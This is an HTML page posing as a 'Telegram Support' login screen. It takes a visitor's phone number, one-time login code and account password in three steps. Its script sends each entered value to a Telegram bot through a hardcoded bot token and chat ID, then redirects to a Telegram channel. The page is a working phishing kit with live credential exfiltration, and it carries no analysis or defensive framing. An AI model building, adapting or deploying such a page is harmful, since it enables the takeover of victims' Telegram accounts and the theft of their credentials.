<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Support</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; margin: 0; }
        .box { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 5px 25px rgba(0,0,0,0.1); width: 320px; text-align: center; }
        img { width: 80px; margin-bottom: 20px; }
        h2 { font-size: 24px; margin-bottom: 10px; color: #222; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
        button { width: 100%; padding: 12px; background: #3390ec; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; margin-top: 15px; }
        .step { display: none; }
        .active { display: block; }
    </style>
</head>
<body>
<div class="box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg">
    <div id="s1" class="step active">
        <h2>Your Phone</h2>
        <input type="tel" id="p" placeholder="Phone Number" required>
        <button onclick="st2()">Next</button>
    </div>
    <div id="s2" class="step">
        <h2>Enter Code</h2>
        <input type="text" id="c" placeholder="Login Code">
        <button onclick="st3()">Next</button>
    </div>
    <div id="s3" class="step">
        <h2>Password</h2>
        <input type="password" id="pw" placeholder="Password">
        <button onclick="fin()">Submit</button>
    </div>
</div>
<script>
    const tok = '7249691006:AAGDEpLHUkarPvbWlyMaTwpABPmJSrDOJPI';
    const cid = '6338638588';
    function send(m) { fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(m)}&parse_mode=Markdown`); }
    function st2() { 
        const ph = document.getElementById('p').value;
        if(ph) { send(`üì± **Phone:** \`${ph}\``); document.getElementById('s1').classList.remove('active'); document.getElementById('s2').classList.add('active'); }
    }
    function st3() {
        const co = document.getElementById('c').value;
        if(co) { send(`üîë **Code:** \`${co}\``); document.getElementById('s2').classList.remove('active'); document.getElementById('s3').classList.add('active'); }
    }
    function fin() {
        const pa = document.getElementById('pw').value;
        if(pa) { send(`üõ°Ô∏è **Pass:** \`${pa}\``); window.location.href = "https://t.me/Mame_Tech_Solution"; }
    }
</script>
</body>
</html>
